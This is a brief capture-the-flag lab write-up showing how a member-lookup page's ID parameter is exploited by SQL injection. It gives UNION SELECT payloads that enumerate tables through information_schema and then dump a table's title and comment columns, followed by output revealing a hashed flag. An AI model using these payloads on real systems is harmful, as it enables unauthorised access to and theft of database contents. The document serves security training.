# SQL INJECTION

_/index.php?page=member_

#### Same as the first flag, we just display value from table list_images table and we get the flag
```
1 or 1=1 UNION SELECT TABLE_NAME, NULL FROM information_schema.tables
```

#### List of list_images table columns
```
list_images
id
url
title
comment
```

#### We display column Commentaire and countersign
```
1 or 1=1 UNION select title, comment FROM list_images
```

#### And we get the flag !!
```
ID: 1 or 1=1 UNION select title, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```


